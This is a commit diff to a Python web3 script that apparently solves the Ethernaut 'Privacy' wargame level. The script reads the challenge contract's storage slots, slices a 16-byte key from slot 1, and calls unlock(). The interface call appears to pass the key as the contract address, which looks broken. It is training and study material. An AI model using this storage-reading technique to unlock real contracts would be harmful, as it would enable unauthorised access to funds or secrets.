d569bbb0276903dcb12fed47589b08f94cc2f008
sarobinson2001 <sarobinson2011@gmail.com>
2023-09-28 19:45:58 +0100

    update 12-deploy_attack.py

--- scripts/12-deploy_attack.py
+++ scripts/12-deploy_attack.py
@@ -14,12 +14,18 @@ def main():
 
     store_0 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
     print(store_0)
-
     store_1 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
     print(store_1)
+    store_2 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 2)
+    print(store_2)
+    store_3 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 3)
+    print(store_3)
 
-    data = store_1  # or whichever slot itis in
+    # assign the key data
+    data = store_1  # OR whichever slot it is in    <----------  HERE
 
+    # assign the finalkey
     key = bytes(data[:16])
 
+    # unlock the Privacy contract
     interface.IPrivacy(key).unlock(key, {"from": player})
